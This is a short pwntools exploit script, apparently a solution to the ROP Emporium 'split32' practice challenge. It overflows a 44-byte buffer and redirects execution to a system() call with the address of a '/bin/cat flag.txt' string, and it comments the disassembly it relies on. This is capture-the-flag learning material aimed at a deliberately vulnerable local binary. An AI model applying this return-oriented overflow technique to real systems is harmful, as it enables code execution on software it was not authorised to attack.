from pwn import *

bin = './split32'
elf = ELF(bin)
'''
functions
-main
-pwnme
-usefulFunction
 8048649:       55                      push   %ebp
 804864a:       89 e5                   mov    %esp,%ebp
 804864c:       83 ec 08                sub    $0x8,%esp
 804864f:       83 ec 0c                sub    $0xc,%esp
 8048652:       68 47 87 04 08          push   $0x8048747
 8048657:       e8 d4 fd ff ff          call   8048430 <system@plt>
 804865c:       83 c4 10                add    $0x10,%esp
 804865f:       90                      nop
 8048660:       c9                      leave
 8048661:       c3                      ret

-/bin/cat flag.txt
0x0804a030


'''
chain = "\x49\x86\x04\x08"

p = process(bin)
print p.recv()

uf = elf.symbols['usefulFunction']
payload = 'A'*44
payload += "\x57\x86\x04\x08\x30\xa0\x04\x08"


p.sendline(payload)
print p.recvall()
